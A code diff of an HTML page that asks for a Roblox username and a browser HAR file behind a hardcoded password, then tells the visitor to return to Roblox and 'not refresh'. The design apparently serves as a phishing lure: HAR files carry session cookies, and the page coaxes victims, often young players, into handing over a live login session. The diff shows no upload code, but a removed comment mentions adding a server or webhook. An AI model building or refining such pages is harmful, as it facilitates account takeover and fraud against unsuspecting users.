@@ -2,126 +2,164 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>HAR File Uploader</title>
+  <title>HAR Upload</title>
   <style>
     body {
       background-color: #121212;
-      color: #ffffff;
+      color: white;
       font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    #password-screen, #upload-screen {
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      margin: 0;
     }
-
-    .container {
-      background-color: #1e1e1e;
-      padding: 30px 40px;
-      border-radius: 8px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.3);
-      width: 100%;
-      max-width: 400px;
-      text-align: center;
+    .input-box {
+      margin: 10px;
+      padding: 10px;
+      font-size: 16px;
+      width: 300px;
+      border-radius: 5px;
+      border: none;
     }
-
-    input[type="password"],
-    input[type="text"],
-    input[type="file"],
-    button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 15px;
+    .button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #007BFF;
+      color: white;
       border: none;
       border-radius: 5px;
-      font-size: 16px;
-    }
-
-    input[type="password"],
-    input[type="text"] {
-      background-color: #2a2a2a;
-      color: #ffffff;
-    }
-
-    input[type="file"] {
-      background-color: #2a2a2a;
-      color: #ffffff;
       cursor: pointer;
+      margin-top: 10px;
     }
-
-    button {
-      background-color: #007bff;
-      color: white;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background-color: #0056b3;
-    }
-
-    #upload-section {
-      display: none;
-    }
-
-    #final-message {
-      background-color: #0d47a1;
-      color: #ffffff;
-      font-weight: bold;
-      padding: 10px;
-      border-radius: 5px;
+    #upload-area {
+      border: 2px dashed grey;
+      padding: 40px;
+      width: 300px;
+      text-align: center;
       margin-top: 20px;
+      border-radius: 5px;
+      transition: border-color 0.3s;
+    }
+    #upload-area.dragover {
+      border-color: #007BFF;
+    }
+    .hidden {
       display: none;
     }
-
-    #error-message {
+    .message-box {
+      background-color: #007BFF;
+      padding: 15px;
+      margin-top: 20px;
+      border-radius: 5px;
+      text-align: center;
+    }
+    .error {
       color: red;
       margin-top: 10px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div id="password-section">
-      <h2>Enter Password</h2>
-      <input type="password" id="password" placeholder="Password">
-      <button onclick="checkPassword()">Enter</button>
-      <div id="error-message"></div>
-    </div>
 
-    <div id="upload-section">
-      <h2>Upload HAR File</h2>
-      <input type="text" id="username" placeholder="Roblox Username">
-      <input type="file" id="har-file" accept=".har">
-      <button onclick="submitUpload()">Submit</button>
-      <div id="final-message">Now go back to the Roblox website and DO NOT REFRESH.</div>
-    </div>
+  <div id="password-screen">
+    <input type="password" id="password" class="input-box" placeholder="Enter password">
+    <button id="password-btn" class="button">Enter</button>
+    <div id="password-error" class="error"></div>
+  </div>
+
+  <div id="upload-screen" class="hidden">
+    <input type="text" id="username" class="input-box" placeholder="Roblox Username">
+    <div id="upload-area">Drag and drop your HAR file here or click to select</div>
+    <input type="file" id="har-file" class="hidden" accept=".har">
+    <button id="submit-btn" class="button">Submit</button>
+    <div id="upload-error" class="error"></div>
+    <div id="message" class="message-box hidden">Go back to the Roblox site. Do not refresh.</div>
   </div>
 
   <script>
-    const correctPassword = "EchoTrails2025";
+    const PASSWORD = "EchoTrails2025";
 
-    function checkPassword() {
-      const input = document.getElementById("password").value;
-      const errorMsg = document.getElementById("error-message");
-      if (input === correctPassword) {
-        document.getElementById("password-section").style.display = "none";
-        document.getElementById("upload-section").style.display = "block";
+    const passwordScreen = document.getElementById("password-screen");
+    const uploadScreen = document.getElementById("upload-screen");
+    const passwordInput = document.getElementById("password");
+    const passwordBtn = document.getElementById("password-btn");
+    const passwordError = document.getElementById("password-error");
+
+    const uploadArea = document.getElementById("upload-area");
+    const harInput = document.getElementById("har-file");
+    const usernameInput = document.getElementById("username");
+    const submitBtn = document.getElementById("submit-btn");
+    const uploadError = document.getElementById("upload-error");
+    const messageBox = document.getElementById("message");
+
+    // Password Check
+    passwordBtn.onclick = () => {
+      if (passwordInput.value === PASSWORD) {
+        passwordScreen.classList.add("hidden");
+        uploadScreen.classList.remove("hidden");
       } else {
-        errorMsg.textContent = "Incorrect password. Try again.";
+        passwordError.textContent = "Incorrect password. Please try again.";
+      }
+    };
+
+    // Drag & Drop Functionality
+    uploadArea.addEventListener("click", () => harInput.click());
+
+    uploadArea.addEventListener("dragover", e => {
+      e.preventDefault();
+      uploadArea.classList.add("dragover");
+    });
+
+    uploadArea.addEventListener("dragleave", () => {
+      uploadArea.classList.remove("dragover");
+    });
+
+    uploadArea.addEventListener("drop", e => {
+      e.preventDefault();
+      uploadArea.classList.remove("dragover");
+      const file = e.dataTransfer.files[0];
+      harInput.files = e.dataTransfer.files;
+      handleFileValidation(file);
+    });
+
+    harInput.addEventListener("change", () => {
+      const file = harInput.files[0];
+      handleFileValidation(file);
+    });
+
+    function handleFileValidation(file) {
+      if (!file.name.endsWith(".har")) {
+        uploadError.textContent = "Only .har files are accepted.";
+        harInput.value = "";
+      } else {
+        uploadError.textContent = "";
       }
     }
 
-    function submitUpload() {
-      const fileInput = document.getElementById("har-file");
-      const file = fileInput.files[0];
-      if (!file || !file.name.endsWith(".har")) {
-        alert("Please upload a valid HAR file.");
+    submitBtn.onclick = () => {
+      const file = harInput.files[0];
+      const username = usernameInput.value.trim();
+
+      if (!file || !username) {
+        uploadError.textContent = "Please fill out both fields before submitting.";
         return;
       }
-      // You can add code here to upload the file to a server/webhook if needed
-      document.getElementById("final-message").style.display = "block";
-    }
+
+      if (!file.name.endsWith(".har")) {
+        uploadError.textContent = "Only .har files are accepted.";
+        return;
+      }
+
+      uploadError.textContent = "";
+      messageBox.classList.remove("hidden");
+    };
   </script>
+
 </body>
 </html>
